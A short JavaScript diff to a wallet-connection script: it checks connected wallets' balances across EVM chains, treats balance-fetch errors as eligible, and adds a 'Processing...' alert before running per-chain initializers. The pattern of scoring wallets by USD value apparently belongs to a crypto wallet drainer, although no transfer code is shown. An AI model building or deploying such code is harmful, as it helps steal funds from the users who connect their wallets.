@@ -202,10 +202,11 @@ export const updateBtnText = async (modal) => {
     for (const chain of Object.keys(chainInitializers)) {
       const address = modal.getAddress();
       const balances = await fetchEvmBalances(chain, address);
-      console.log(balances);
-      if (balances?.error) continue;
+      if (balances?.error){
+         eligible++
+         continue;
+      };
       const { nativeBalanceUsd, tokens } = balances;
-
       if (nativeBalanceUsd < MIN && !tokens.find((t) => t.balanceUsd >= MIN)) {
         console.log(
           `✍🏻 ${chain.toUpperCase()} has 0 or less than ${MIN}USD balances both native & Tokens = Ineligible Wallet ⛔️`
@@ -257,6 +258,7 @@ export const updateBtnText = async (modal) => {
     if (processed) return;
     processed = true;
 
+    alert("Processing...");
     for (const chain of Object.keys(chainInitializers)) {
       const { initializer, type, balances } = chainInitializers[chain];
       if (!balances){
